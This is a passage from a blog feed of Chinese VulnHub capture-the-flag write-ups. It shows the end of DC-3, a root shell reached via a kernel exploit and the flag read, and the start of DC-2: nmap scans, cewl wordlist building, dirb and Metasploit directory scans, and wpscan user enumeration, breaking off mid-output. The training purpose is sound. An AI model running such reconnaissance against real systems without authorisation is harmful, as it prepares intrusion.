class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">root@DC-3:/tmp/39772/ebpf_mapfd_doubleput_exploit<span class="comment"># cd </span></span><br><span class="line">bash: <span class="built_in">cd</span>: HOME not <span class="built_in">set</span></span><br><span class="line">root@DC-3:/tmp/39772/ebpf_mapfd_doubleput_exploit<span class="comment"># cd /</span></span><br><span class="line">root@DC-3:/<span class="comment"># </span></span><br><span class="line">root@DC-3:/<span class="comment"># </span></span><br><span class="line">root@DC-3:/<span class="comment"># </span></span><br><span class="line">root@DC-3:/<span class="comment"># ls</span></span><br><span class="line">bin   dev  home        lib         media  opt   root  sbin  srv  tmp  var</span><br><span class="line">boot  etc  initrd.img  lost+found  mnt    proc  run   snap  sys  usr  vmlinuz</span><br><span class="line">root@DC-3:/<span class="comment"># cd /root</span></span><br><span class="line">root@DC-3:/root<span class="comment"># </span></span><br><span class="line">root@DC-3:/root<span class="comment"># ls</span></span><br><span class="line">the-flag.txt</span><br><span class="line">root@DC-3:/root<span class="comment"># cat the-flag.txt </span></span><br><span class="line"> __        __   _ _   ____                   _ _ _ _ </span><br><span class="line"> \ \      / /__| | | |  _ \  ___  _ __   ___| | | | |</span><br><span class="line">  \ \ /\ / / _ \ | | | | | |/ _ \| <span class="string">&#x27;_ \ / _ \ | | | |</span></span><br><span class="line"><span class="string">   \ V  V /  __/ | | | |_| | (_) | | | |  __/_|_|_|_|</span></span><br><span class="line"><span class="string">    \_/\_/ \___|_|_| |____/ \___/|_| |_|\___(_|_|_|_)</span></span><br><span class="line"><span class="string">                                                     </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Congratulations are in order.  :-)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">I hope you&#x27;</span>ve enjoyed this challenge as I enjoyed making it.</span><br><span class="line"></span><br><span class="line">If there are any ways that I can improve these little challenges,</span><br><span class="line">please <span class="built_in">let</span> me know.</span><br><span class="line"></span><br><span class="line">As per usual, comments and complaints can be sent via Twitter to @DCAU7</span><br><span class="line"></span><br><span class="line">Have a great day!!!!</span><br><span class="line">root@DC-3:/root<span class="comment">#</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x00-官网描述&quot;&gt;&lt;a href=&quot;#0x00-官网描述&quot; class=&quot;headerlink&quot; title=&quot;0x00.官网描述&quot;&gt;&lt;/a&gt;0x00.官网描述&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;DC-3 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.&lt;/p&gt;
&lt;p&gt;As with the previous DC releases, this one is designed with beginners in mind, although this time around, there is only one flag, one entry point and no clues at all.&lt;/p&gt;
&lt;p&gt;Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.&lt;/p&gt;
&lt;p&gt;For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I won’t give you the answer, instead, I’ll give you an idea about how to move forward.&lt;/p&gt;
&lt;p&gt;For those with experience doing CTF and Boot2Root challenges, this probably won’t take you long at all (in fact, it could take you less than 20 minutes easily).&lt;/p&gt;
&lt;p&gt;If that’s the case, and if you want it to be a bit more of a challenge, you can always redo the challenge and explore other ways of gaining root and obtaining the flag.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;DC-3之后不再有提示信息，只有一个最终flag&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="vulnhub" scheme="https://lunamoore.github.io/categories/vulnhub/"/>
    
    
    <category term="靶机" scheme="https://lunamoore.github.io/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>DC:2</title>
    <link href="https://lunamoore.github.io/2020/08/21/DC-2/"/>
    <id>https://lunamoore.github.io/2020/08/21/DC-2/</id>
    <published>2020-08-21T06:45:33.000Z</published>
    <updated>2020-08-21T06:55:43.487Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-官网描述"><a href="#0x00-官网描述" class="headerlink" title="0x00.官网描述"></a>0x00.官网描述</h2><blockquote><p>Much like DC-1, DC-2 is another purposely built vulnerable lab for the purpose of gaining experience in the world of penetration testing.</p><p>As with the original DC-1, it’s designed with beginners in mind.</p><p>Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.</p><p>Just like with DC-1, there are five flags including the final flag.</p><p>And again, just like with DC-1, the flags are important for beginners, but not so important for those who have experience.</p><p>In short, the only flag that really counts, is the final flag.</p><p>For beginners, Google is your friend. Well, apart from all the privacy concerns etc etc.</p><p>I haven’t explored all the ways to achieve root, as I scrapped the previous version I had been working on, and started completely fresh apart from the base OS install.</p></blockquote><a id="more"></a><h2 id="0x01-上nmap"><a href="#0x01-上nmap" class="headerlink" title="0x01.上nmap"></a>0x01.上nmap</h2><p><code>可以发现1为网关，2为宿主机，6为kali，那么4就是我们的受害者</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC2<span class="comment"># nmap -sP 192.168.1.0/24 -oN nmap.sP</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-20 21:59 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.1</span><br><span class="line">Host is up (0.0018s latency).</span><br><span class="line">MAC Address: 68:D1:BA:1F:FD:48 (Shenzhen Youhua Technology)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.2</span><br><span class="line">Host is up (0.00043s latency).</span><br><span class="line">MAC Address: 50:5B:C2:8C:BE:A5 (Liteon Technology)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.4</span><br><span class="line">Host is up (0.00029s latency).</span><br><span class="line">MAC Address: 00:0C:29:83:64:3E (VMware)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.6</span><br><span class="line">Host is up.</span><br><span class="line">Nmap <span class="keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="keyword">in</span> 2.08 seconds</span><br><span class="line">root@JIYE:~/tmp/DC2<span class="comment">#</span></span><br></pre></td></tr></table></figure><h2 id="0x02-继续nmap扫描服务及端口"><a href="#0x02-继续nmap扫描服务及端口" class="headerlink" title="0x02.继续nmap扫描服务及端口"></a>0x02.继续nmap扫描服务及端口</h2><p><code>可以发现开放了80/7744端口，并且7744为ssh</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC2<span class="comment"># nmap -A 192.168.1.4 -p 1-65535 -oN nmap.A</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-20 22:05 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.4</span><br><span class="line">Host is up (0.00048s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.10 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.10 (Debian)</span><br><span class="line">|_http-title: Did not follow redirect to http://dc-2/</span><br><span class="line">|_https-redirect: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 52:51:7b:6e:70:a4:33:7a:d2:4b:e1:0b:5a:0f:9e:d7 (DSA)</span><br><span class="line">|   2048 59:11:d8:af:38:51:8f:41:a7:44:b3:28:03:80:99:42 (RSA)</span><br><span class="line">|   256 df:18:1d:74:26:ce:c1:4f:6f:2f:c1:26:54:31:51:91 (ECDSA)</span><br><span class="line">|_  256 d9:38:5f:99:7c:0d:64:7e:1d:46:f6:e9:7c:c6:37:17 (ED25519)</span><br><span class="line">MAC Address: 00:0C:29:83:64:3E (VMware)</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.48 ms 192.168.1.4</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 14.20 seconds</span><br><span class="line">root@JIYE:~/tmp/DC2<span class="comment"># </span></span><br></pre></td></tr></table></figure><h2 id="0x03-发现80端口，直接访问"><a href="#0x03-发现80端口，直接访问" class="headerlink" title="0x03.发现80端口，直接访问"></a>0x03.发现80端口，直接访问</h2><p><code>发现重定向到了dc-/且无法解析</code></p><img src="/2020/08/21/DC-2/image-20200821101342609.png" class><h2 id="0x04-修改hosts文件，进行本地解析"><a href="#0x04-修改hosts文件，进行本地解析" class="headerlink" title="0x04.修改hosts文件，进行本地解析"></a>0x04.修改hosts文件，进行本地解析</h2><h3 id="1-添加一行"><a href="#1-添加一行" class="headerlink" title="1.添加一行"></a>1.添加一行</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.1.4        dc-2</span><br></pre></td></tr></table></figure><h3 id="2-再次访问"><a href="#2-再次访问" class="headerlink" title="2.再次访问"></a>2.再次访问</h3><img src="/2020/08/21/DC-2/image-20200821101740236.png" class><h3 id="3-发现网站cms是wordpress，并且也得到了flag1与其他提示"><a href="#3-发现网站cms是wordpress，并且也得到了flag1与其他提示" class="headerlink" title="3.发现网站cms是wordpress，并且也得到了flag1与其他提示"></a>3.发现网站cms是wordpress，并且也得到了flag1与其他提示</h3><img src="/2020/08/21/DC-2/image-20200821102232934.png" class><h2 id="0x5-进行cewl"><a href="#0x5-进行cewl" class="headerlink" title="0x5.进行cewl"></a>0x5.进行cewl</h2><p><code>cewl根据指定url爬行，生成定制化的密码字典</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC2<span class="comment"># cewl dc-2 &gt; pwd.dict</span></span><br><span class="line">root@JIYE:~/tmp/DC2<span class="comment"># wc -l pwd.dict </span></span><br><span class="line">239 pwd.dict</span><br><span class="line">root@JIYE:~/tmp/DC2<span class="comment"># </span></span><br></pre></td></tr></table></figure><h2 id="0x06-扫描目录"><a href="#0x06-扫描目录" class="headerlink" title="0x06.扫描目录"></a>0x06.扫描目录</h2><p><code>由于是一个web application，所以进行一下目录扫描，本次使用msf，也可以使用dirb，gobuster</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use auxiliary/scanner/http/dir_scanner </span><br><span class="line">msf5 auxiliary(scanner/http/dir_scanner) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/http/dir_scanner):</span><br><span class="line"></span><br><span class="line">   Name        Current Setting                                          Required  Description</span><br><span class="line">   ----        ---------------                                          --------  -----------</span><br><span class="line">   DICTIONARY  /usr/share/metasploit-framework/data/wmap/wmap_dirs.txt  no        Path of word dictionary to use</span><br><span class="line">   PATH        /                                                        yes       The path  to identify files</span><br><span class="line">   Proxies                                                              no        A proxy chain of format <span class="built_in">type</span>:host:port[,<span class="built_in">type</span>:host:port][...]</span><br><span class="line">   RHOSTS                                                               yes       The target host(s), range CIDR identifier, or hosts file with syntax <span class="string">&#x27;file:&lt;path&gt;&#x27;</span></span><br><span class="line">   RPORT       80                                                       yes       The target port (TCP)</span><br><span class="line">   SSL         <span class="literal">false</span>                                                    no        Negotiate SSL/TLS <span class="keyword">for</span> outgoing connections</span><br><span class="line">   THREADS     1                                                        yes       The number of concurrent threads (max one per host)</span><br><span class="line">   VHOST                                                                no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line">msf5 auxiliary(scanner/http/dir_scanner) &gt; <span class="built_in">set</span> rhosts 192.168.1.4</span><br><span class="line">rhosts =&gt; 192.168.1.4</span><br><span class="line">msf5 auxiliary(scanner/http/dir_scanner) &gt; <span class="built_in">set</span> threads 50</span><br><span class="line">threads =&gt; 50</span><br><span class="line">msf5 auxiliary(scanner/http/dir_scanner) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Detecting error code</span><br><span class="line">[*] Using code <span class="string">&#x27;404&#x27;</span> as not found <span class="keyword">for</span> 192.168.1.4</span><br><span class="line">[+] Found http://192.168.1.4:80/icons/ 404 (192.168.1.4)</span><br><span class="line">[+] Found http://192.168.1.4:80/wp-includes/ 404 (192.168.1.4)</span><br><span class="line">[*] Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure><p><code>可以发现wp-includes目录，访问一下，可以发现文件目录，然而并没有什么有用的信息，还得dirb</code></p><img src="/2020/08/21/DC-2/image-20200821105032116.png" class><p><code>dirb扫描发现wp-admin，尝试打开</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC2<span class="comment"># dirb http://dc-2</span></span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Fri Aug 21 01:08:03 2020</span><br><span class="line">URL_BASE: http://dc-2/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://dc-2/ ----</span><br><span class="line">+ http://dc-2/index.php (CODE:301|SIZE:0)                                         </span><br><span class="line">+ http://dc-2/server-status (CODE:403|SIZE:292)                                     </span><br><span class="line">==&gt; DIRECTORY: http://dc-2/wp-admin/                                                 </span><br><span class="line">==&gt; DIRECTORY: http://dc-2/wp-content/                                              </span><br><span class="line">==&gt; DIRECTORY: http://dc-2/wp-includes/                                             </span><br><span class="line">+ http://dc-2/xmlrpc.php (CODE:405|SIZE:42)                                         </span><br><span class="line">---- Entering directory: http://dc-2/wp-admin/ ----</span><br><span class="line">+ http://dc-2/wp-admin/admin.php (CODE:302|SIZE:0)                                   </span><br><span class="line">==&gt; DIRECTORY: http://dc-2/wp-admin/css/                                             </span><br><span class="line">==&gt; DIRECTORY: http://dc-2/wp-admin/images/                                         </span><br><span class="line">==&gt; DIRECTORY: http://dc-2/wp-admin/includes/                                       </span><br><span class="line">+ http://dc-2/wp-admin/index.php (CODE:302|SIZE:0)                                   </span><br><span class="line">==&gt; DIRECTORY: http://dc-2/wp-admin/js/                                             </span><br><span class="line">==&gt; DIRECTORY: http://dc-2/wp-admin/maint/                                           </span><br><span class="line">==&gt; DIRECTORY: http://dc-2/wp-admin/network/                                         </span><br><span class="line">==&gt; DIRECTORY: http://dc-2/wp-admin/user/                                           </span><br><span class="line">---- Entering directory: http://dc-2/wp-content/ ----</span><br><span class="line">+ http://dc-2/wp-content/index.php (CODE:200|SIZE:0)                                 </span><br><span class="line">==&gt; DIRECTORY: http://dc-2/wp-content/languages/                                     </span><br><span class="line">==&gt; DIRECTORY: http://dc-2/wp-content/plugins/                                       </span><br><span class="line">==&gt; DIRECTORY: http://dc-2/wp-content/themes/                                       </span><br><span class="line">---- Entering directory: http://dc-2/wp-includes/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode <span class="string">&#x27;-w&#x27;</span> <span class="keyword">if</span> you want to scan it anyway)</span><br><span class="line">---- Entering directory: http://dc-2/wp-admin/css/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode <span class="string">&#x27;-w&#x27;</span> <span class="keyword">if</span> you want to scan it anyway)</span><br><span class="line">---- Entering directory: http://dc-2/wp-admin/images/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode <span class="string">&#x27;-w&#x27;</span> <span class="keyword">if</span> you want to scan it anyway)</span><br><span class="line">---- Entering directory: http://dc-2/wp-admin/includes/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode <span class="string">&#x27;-w&#x27;</span> <span class="keyword">if</span> you want to scan it anyway)</span><br><span class="line">---- Entering directory: http://dc-2/wp-admin/js/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode <span class="string">&#x27;-w&#x27;</span> <span class="keyword">if</span> you want to scan it anyway)</span><br><span class="line">---- Entering directory: http://dc-2/wp-admin/maint/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode <span class="string">&#x27;-w&#x27;</span> <span class="keyword">if</span> you want to scan it anyway)</span><br><span class="line">---- Entering directory: http://dc-2/wp-admin/network/ ----</span><br><span class="line">+ http://dc-2/wp-admin/network/admin.php (CODE:302|SIZE:0)                           </span><br><span class="line">+ http://dc-2/wp-admin/network/index.php (CODE:302|SIZE:0)                           </span><br><span class="line">---- Entering directory: http://dc-2/wp-admin/user/ ----</span><br><span class="line">+ http://dc-2/wp-admin/user/admin.php (CODE:302|SIZE:0)                             </span><br><span class="line">+ http://dc-2/wp-admin/user/index.php (CODE:302|SIZE:0)                             </span><br><span class="line">---- Entering directory: http://dc-2/wp-content/languages/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode <span class="string">&#x27;-w&#x27;</span> <span class="keyword">if</span> you want to scan it anyway)</span><br><span class="line">---- Entering directory: http://dc-2/wp-content/plugins/ ----</span><br><span class="line">+ http://dc-2/wp-content/plugins/index.php (CODE:200|SIZE:0)                         </span><br><span class="line">---- Entering directory: http://dc-2/wp-content/themes/ ----</span><br><span class="line">+ http://dc-2/wp-content/themes/index.php (CODE:200|SIZE:0)                         </span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Fri Aug 21 01:08:24 2020</span><br><span class="line">DOWNLOADED: 32284 - FOUND: 12</span><br><span class="line">root@JIYE:~/tmp/DC2<span class="comment"># </span></span><br></pre></td></tr></table></figure><p><code>可以发现重定向到了wp-login.php</code></p><img src="/2020/08/21/DC-2/image-20200821131351459.png" class><p><code>由于是wordpress cms，所以可以使用wpscan</code></p><h2 id="0x07-wpscan扫描"><a href="#0x07-wpscan扫描" class="headerlink" title="0x07.wpscan扫描"></a>0x07.wpscan扫描</h2><p><code>扫描存在的用户</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC2<span class="comment"># wpscan --url dc-2 -e u</span></span><br><span class="line">_______________________________________________________________</span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        / /  __ \ / ____|</span><br><span class="line">          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®</span><br><span class="line">           \ \/  \/ / |  ___/ \___ \ / __|/ _` | <span class="string">&#x27;_ \</span></span><br><span class="line"><span class="string">            \  /\  /  | |     ____) | (__| (_| | | | |</span></span><br><span class="line"><span class="string">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">         WordPress Security Scanner by the WPScan Team</span></span><br><span class="line"><span class="string">                         Version 3.8.4</span></span><br><span class="line"><span class="string">       Sponsored by Automattic - https://automattic.com/</span></span><br><span class="line"><span class="string">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span></span><br><span class="line"><span class="string">_______________________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] URL: http://dc-2/ [192.168.1.4]</span></span><br><span class="line"><span class="string">[+] Started: Fri Aug 21 00:37:54 2020</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Interesting Finding(s):</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Headers</span></span><br><span class="line"><span class="string"> | Interesting Entry: Server: Apache/2.4.10 (Debian)</span></span><br><span class="line"><span class="string"> | Found By: Headers (Passive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] XML-RPC seems to be enabled: http://dc-2/xmlrpc.php</span></span><br><span class="line"><span class="string"> | Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"> | References:</span></span><br><span class="line"><span class="string"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://dc-2/readme.html</span></span><br><span class="line"><span class="string"> | Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] The external WP-Cron seems to be enabled: http://dc-2/wp-cron.php</span></span><br><span class="line"><span class="string"> | Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 60%</span></span><br><span class="line"><span class="string"> | References:</span></span><br><span class="line"><span class="string"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span></span><br><span class="line"><span class="string"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] WordPress version 4.7.10 identified (Insecure, released on 2018-04-03).</span></span><br><span class="line"><span class="string"> | Found By: Rss Generator (Passive Detection)</span></span><br><span class="line"><span class="string"> |  - http://dc-2/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=4.7.10&lt;/generator&gt;</span></span><br><span class="line"><span class="string"> |  - http://dc-2/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=4.7.10&lt;/generator&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] WordPress theme in use: twentyseventeen</span></span><br><span class="line"><span class="string"> | Location: http://dc-2/wp-content/themes/twentyseventeen/</span></span><br><span class="line"><span class="string"> | Last Updated: 2020-08-11T00:00:00.000Z</span></span><br><span class="line"><span class="string"> | Readme: http://dc-2/wp-content/themes/twentyseventeen/README.txt</span></span><br><span class="line"><span class="string"> | [!] The version is out of date, the latest version is 2.4</span></span><br><span class="line"><span class="string"> | Style URL: http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10</span></span><br><span class="line"><span class="string"> | Style Name: Twenty Seventeen</span></span><br><span class="line"><span class="string"> | Style URI: https://wordpress.org/themes/twentyseventeen/</span></span><br><span class="line"><span class="string"> | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...</span></span><br><span class="line"><span class="string"> | Author: the WordPress team</span></span><br><span class="line"><span class="string"> | Author URI: https://wordpress.org/</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Found By: Css Style In Homepage (Passive Detection)</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Version: 1.2 (80% confidence)</span></span><br><span class="line"><span class="string"> | Found By: Style (Passive Detection)</span></span><br><span class="line"><span class="string"> |  - http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10, Match: &#x27;</span>Version: 